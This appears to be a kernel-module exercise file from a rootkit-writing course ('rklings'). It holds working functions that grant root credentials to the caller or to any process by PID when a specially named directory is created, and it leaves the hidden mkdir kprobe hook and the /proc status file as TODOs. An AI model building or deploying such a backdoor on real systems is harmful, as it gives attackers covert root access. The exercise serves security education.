// SPDX-License-Identifier: GPL-2.0
//
// Your task: write a kprobe from scratch. No rklings_hook.h.
// Hook __x64_sys_mkdir, intercept "rklings." commands, and
// expose a /proc/rklings status file.
//
#include <linux/cred.h>
#include <linux/errno.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/pid.h>
#include <linux/proc_fs.h>
#include <linux/ptrace.h>
#include <linux/rcupdate.h>
#include <linux/sched.h>
#include <linux/sched/task.h>
#include <linux/seq_file.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/uaccess.h>

#define RK_PREFIX     "rklings."
#define RK_PREFIX_LEN 8
#define RK_PATH_MAX   128

static int deferred_pid;

static int rk_escalate(void)
{
	struct cred *new_cred;

	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred)
		return -ENOMEM;
	return commit_creds(new_cred);
}

static int rk_escalate_pid(int pid)
{
	struct task_struct *task;
	struct cred *new_cred;
	const struct cred *old_cred;

	rcu_read_lock();
	task = pid_task(find_vpid(pid), PIDTYPE_PID);
	if (!task) {
		rcu_read_unlock();
		return -ESRCH;
	}
	if (!task->mm) {
		rcu_read_unlock();
		return -EINVAL;
	}
	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred) {
		rcu_read_unlock();
		return -ENOMEM;
	}
	old_cred = (const struct cred *)task->real_cred;
	rcu_assign_pointer(task->real_cred, new_cred);
	rcu_assign_pointer(task->cred, new_cred);
	rcu_read_unlock();
	put_cred(old_cred);
	return 0;
}

static int rk_try_deferred(void)
{
	int ret;

	if (deferred_pid <= 0)
		return 0;
	ret = rk_escalate_pid(deferred_pid);
	if (ret == 0)
		deferred_pid = 0;
	return ret;
}

static int rk_handle_mkdir(const char *name)
{
	const char *suffix;
	int pid;
	int ret;

	if (strcmp(name, "rklings.e") == 0)
		return rk_escalate();

	if (strncmp(name, "rklings.e.", 10) != 0)
		return -ENOENT;

	suffix = name + 10;
	if (kstrtoint(suffix, 10, &pid) != 0 || pid <= 0)
		return -EINVAL;

	ret = rk_escalate_pid(pid);
	if (ret == -ESRCH) {
		deferred_pid = pid;
		return 0;
	}
	return ret;
}

/* TODO: Write rk_pre_handler, a kprobe pre_handler for __x64_sys_mkdir.
 * Extract the userspace pathname from pt_regs, copy it to a kernel buffer,
 * find the basename, check the "rklings." prefix, call rk_handle_mkdir,
 * then nullify the pathname so the real syscall sees an empty string. */

/* TODO: Define a static struct kprobe targeting "__x64_sys_mkdir". */

/* TODO: Write rk_proc_show for /proc/rklings. Call rk_try_deferred(),
 * then print "deferred: <pid>" or "idle". */

static int __init rk_init(void)
{
	/* TODO: Register the kprobe and create /proc/rklings. */
	return 0;
}

static void __exit rk_exit(void)
{
	/* TODO: Remove /proc/rklings and unregister the kprobe. */
}

module_init(rk_init);
module_exit(rk_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings kprobe hook from scratch");
